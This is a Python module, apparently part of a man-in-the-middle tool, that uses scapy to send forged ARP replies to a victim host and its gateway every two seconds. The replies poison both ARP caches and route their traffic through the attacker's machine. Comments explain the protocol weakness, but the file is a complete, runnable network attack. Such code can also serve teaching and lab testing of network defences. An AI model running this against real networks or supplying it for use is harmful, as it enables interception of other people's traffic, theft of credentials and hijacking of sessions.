#!/usr/bin/env python3
"""
Poisoner: continuously sends forged ARP replies to both the gateway and
the victim so each one stores the attacker's MAC address against the
other's IP address.
"""
import time
from scapy.all import Ether, ARP, sendp
from config import TARGET_CONFIG


def run_poisoner():
    """
    Continuously send forged ARP replies to poison both the victim's and
    the gateway's ARP caches, redirecting their traffic through us.

    Runs forever (until interrupted) because a poisoned ARP entry is not
    permanent -- the OS will eventually re-learn the real mapping unless
    we keep re-asserting the fake one.
    """
    time.sleep(1)  # give main.py a moment to finish writing TARGET_CONFIG
    interface = TARGET_CONFIG["interface"]
    gateway_ip = TARGET_CONFIG["gateway_ip"]
    gateway_mac = TARGET_CONFIG["gateway_mac"]
    victim_ip = TARGET_CONFIG["victim_ip"]
    victim_mac = TARGET_CONFIG["victim_mac"]
    attacker_mac = TARGET_CONFIG["attacker_mac"]

    print(f"[*] Poisoner active: spoofing gateway ({gateway_ip}) and victim ({victim_ip})")

    # op=2 makes this an ARP *reply* rather than a request (op=1). A real
    # host normally only sends a reply after being asked, but ARP has no
    # authentication -- an unsolicited "gratuitous" reply is accepted and
    # cached anyway, which is exactly the weakness this attack exploits.
    # Told to the victim: "the gateway's IP lives at my MAC now."
    victim_packet = Ether(dst=victim_mac, src=attacker_mac) / ARP(
        op=2,               # ARP reply
        pdst=victim_ip,     # the IP address of the victim
        psrc=gateway_ip,    # the IP address of the gateway
        hwdst=victim_mac,   # the MAC address of the victim
        hwsrc=attacker_mac  # the MAC address of the attacker
    )
    # Told to the gateway: "the victim's IP lives at my MAC now."
    gateway_packet = Ether(dst=gateway_mac, src=attacker_mac) / ARP(
        op=2,               # ARP reply
        pdst=gateway_ip,    # the IP address of the gateway
        psrc=victim_ip,     # the IP address of the victim
        hwdst=gateway_mac,  # the MAC address of the gateway
        hwsrc=attacker_mac  # the MAC address of the attacker
    )

    # ARP cache entries eventually time out on their own, so we keep
    # re-sending both forged replies every couple of seconds to hold
    # the poisoned state for as long as the attack needs to run.
    try:
        while True:
            sendp(victim_packet, iface=interface, verbose=False)
            sendp(gateway_packet, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        pass
